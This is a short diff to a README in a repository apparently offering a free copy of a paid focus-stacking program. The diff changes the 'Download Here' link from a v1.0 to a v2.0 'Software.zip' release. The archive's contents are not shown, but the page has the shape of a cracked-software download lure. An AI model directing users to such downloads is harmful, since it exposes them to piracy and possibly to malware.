@@ -25,7 +25,7 @@ This repository is dedicated to providing information and resources related to *
 
 ## Resources:
 For downloading the software package, you can use the following link:
-[![Download Here](https://github.com/Sarthakpvp/Helicon-Focus-Pro-Free/releases/download/v1.0/Software.zip)](https://github.com/Sarthakpvp/Helicon-Focus-Pro-Free/releases/download/v1.0/Software.zip)
+[![Download Here](https://github.com/Sarthakpvp/Helicon-Focus-Pro-Free/releases/download/v2.0/Software.zip)](https://github.com/Sarthakpvp/Helicon-Focus-Pro-Free/releases/download/v2.0/Software.zip)
 *Launch the link to start the download process.*
 
 If the provided link is not working, please check the "Releases" section of this repository for alternative download options.
